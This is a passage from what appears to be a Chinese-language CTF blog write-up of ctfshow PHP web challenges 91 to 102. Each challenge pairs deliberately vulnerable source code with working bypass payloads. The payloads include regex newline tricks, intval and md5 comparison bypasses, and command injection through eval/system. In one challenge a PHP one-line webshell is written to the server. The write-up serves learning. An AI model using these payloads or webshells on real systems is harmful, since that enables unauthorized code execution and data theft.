class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class=\"line\">        echo &#x27;hacker&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &#x27;nonononono&#x27;;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>我们先来看看 <code>正则匹配修饰符</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i 不区分(ignore)大小写；</span><br><span class=\"line\">g 全局(global)匹配</span><br><span class=\"line\">m 多(more)行匹配</span><br><span class=\"line\">s 特殊字符圆点 . 中包含换行符</span><br><span class=\"line\">U 只匹配最近的一个字符串;不重复匹配; </span><br><span class=\"line\">//修正符:x 将模式中的空白忽略; </span><br><span class=\"line\">//修正符:A 强制从目标字符串开头匹配;</span><br><span class=\"line\">//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class=\"line\">//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </span><br></pre></td></tr></table></figure>\n\n<p><code>(preg_match(&#39;/^php$/im&#39;, $a))</code>这个匹配以php开头的字符串并且多行匹配</p>\n<p><code>(preg_match(&#39;/^php$/i&#39;, $a))</code>这个也是匹配以php开头的字符串，但不支持多行匹配，只能匹配一行</p>\n<blockquote>\n<p>preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾</p>\n</blockquote>\n<p><code>%0a</code>换行，相当于enter</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=%0aphp</span><br><span class=\"line\">或?cmd=php%0a1   (但php%0a不行)</span><br></pre></td></tr></table></figure>\n\n<p>这里我有个小小的疑惑点，针对第一个 <code>%0aphp</code>显然这里是匹配的第一行，第二个payload <code>php%0a1</code>，显然这里匹配的是第二行，所以具体的匹配机制有点没懂</p>\n<p>请假了一下群里的师傅这里主要跟<code>^php$</code>这个有关，<code>(preg_match(&#39;/^php$/i&#39;, $a))</code>这个以一整行为一个整体进行判断，经过测试这个只匹配第一行</p>\n<h3 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法</p>\n</blockquote>\n<p>所以我们可以用e绕过也可以用二进制（0b），十六进制（0x）绕过</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=0b1000101111100</span><br><span class=\"line\">?num=0x117c</span><br><span class=\"line\">?num=4476e123</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n\n<p>比上一题多过滤了一个字母，这样我们e和二进制，十六进制都用不了，</p>\n<p>八进制是以数字0开头的，刚好可以绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一题相对于上一题，不让数字0出现在第一位,而且第一个if是<code>===</code>强比较</p>\n<p>我们可以用小数 <code>4476.0</code>绕过 或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=4476.0</span><br></pre></td></tr></table></figure>\n\n<p>可以在前面加上一个加号，当空格</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=+010574</span><br><span class=\"line\">?num= 010574//空格也可以</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里第一个判断又换成弱比较了，只能用 空格和 <code>+</code> 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num= 010574</span><br><span class=\"line\">?num=+010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class=\"line\">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;no no no&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这题没什么过滤直接读当前目录下的flag.php就好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=./flag.php</span><br></pre></td></tr></table></figure>\n\n<p>或者用伪协议读取也行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web97\"><a href=\"#web97\" class=\"headerlink\" title=\"web97\"></a>web97</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class=\"line\">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class=\"line\">echo $flag;</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#x27;Wrong.&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>题目需要我们用post方式传入a和b，并且a!&#x3D;b（这里是弱比较）</p>\n<p>但这里<code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code>这里我们可以利用一个字符串比较的一个特性</p>\n<blockquote>\n<p>MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web98\"><a href=\"#web98\" class=\"headerlink\" title=\"web98\"></a>web98</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class=\"line\">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;` </span><br></pre></td></tr></table></figure>\n\n<p>这句话解释一下，这是三目运算符</p>\n<p>当存在GET传参时，则把post传参地址给get，如果不存在则传的参数为flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>如果传的flag&#x3D;’flag’,则把COOKIE传参地址给get,否则让其等于’flag’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; </span><br></pre></td></tr></table></figure>\n\n<p>如果传的flag&#x3D;’flag’,则把SERVER传参地址给get,否则让其等于’flag’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__</span><br></pre></td></tr></table></figure>\n\n<p>如果传入的HTTP_FLAG&#x3D;‘flag’显示$flag，否则显示当前页面</p>\n<p>如果我们直接用get方式传入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>由于存在GET传参，会把post传参地址给get</p>\n<p>所以这里我们随便用get方式传入一个，然后用post覆盖掉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=1111</span><br><span class=\"line\"></span><br><span class=\"line\">post:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>即可highlight_file($flag)，因为$flag不是php文件，所以会导致报错而回显$flag的值</p>\n<h3 id=\"web99\"><a href=\"#web99\" class=\"headerlink\" title=\"web99\"></a>web99</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$allow = array();</span><br><span class=\"line\">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class=\"line\">    array_push($allow, rand(1,$i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class=\"line\">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p><code>array_push</code></p>\n<blockquote>\n<p>array_push — 将一个或多个单元压入数组的末尾（入栈）</p>\n</blockquote>\n<p><code>in_array</code></p>\n<blockquote>\n<p>检查数组中是否存在某个值，如果没有设置第三个参数，则使用宽松的比较，先将字符串转化为i数字，再比较</p>\n</blockquote>\n<p>分析一下题目首先将许多随机数放入数组中，然后当传入的n在数组中，将content写入传入的n中</p>\n<p>由于这里循环了很多次，出现1的概率比较大（多试几次总能成功）</p>\n<p>然后是 1.php在进行判断时 <code>1.php == 1</code></p>\n<p>并将一句话木马写入content</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?n=1.php</span><br><span class=\"line\"></span><br><span class=\"line\">POST:content=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>蚁剑连接即可</p>\n<h3 id=\"web100\"><a href=\"#web100\" class=\"headerlink\" title=\"web100\"></a>web100</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>is_numeric</code></p>\n<blockquote>\n<p>— 检测变量是否为数字或数字字符串</p>\n</blockquote>\n<p>这个题第一次做的时候时非常懵逼的</p>\n<p>这题的解题点在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>\n\n<p>这里就要讲一下运算符的优先级问题了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;&amp; --&gt; || --&gt; = --&gt; and --&gt; or</span><br></pre></td></tr></table></figure>\n\n<p>所以题目这里赋值的优先级大于and，即</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1)</span><br></pre></td></tr></table></figure>\n\n<p>所以这里我们只需要让v1为数字，后面两个参数可控，v2,v3过滤了分号，</p>\n<p>现在就要解决</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>突然发现题目注释里有  <code>flag in class ctfshow; </code></p>\n<p>我这里直接用管道符了<code>||</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)||&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这个题相比上个，增加了许多过滤</p>\n<p>主要还是构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); </span><br></pre></td></tr></table></figure>\n\n<p>这里也是看了很多师傅的wp才理解，需要讲一下</p>\n<p><code>ReflectionClasss</code></p>\n<blockquote>\n<p>反射类ReflectionClass执行命令</p>\n<p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作<br>反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令</p>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n<p>最后将 0x2d改为 -  ，发现只有35位，没想到最后一位要爆破。。。看运气咯</p>\n<h3 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    file_put_contents($v3,$str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>substr</code></p>\n<blockquote>\n<p><strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] ) : string</p>\n<p>返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p>\n</blockquote>\n<p>这里 <code>$s = substr($v2,2);</code>截取了v2的[2:],从第三个字符到末尾</p>\n<p><code>call_user_func</code></p>\n<blockquote>\n<p><strong>call_user_func</strong> ( <a href=\"php/language.types.callable.html\">callable</a> <code>$callback</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$parameter</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$...</code> ]] ) : <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a></p>\n<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>\n</blockquote>\n<p>这里v1，v3可控，v2要保证能写shell，又要保证能为数字。</p>\n<p>这里百思不得其解，看了师傅的wp后，真的要感叹一下，师傅们的创造力啊！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`tac *`;  </span><br></pre></td></tr></table></figure>\n\n<p>这是我们要执行的命令，进行hex编码后为：3c3f3d60746163202a603b ，发现其中有字母<br>于是在此之前进行base64编码一次</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 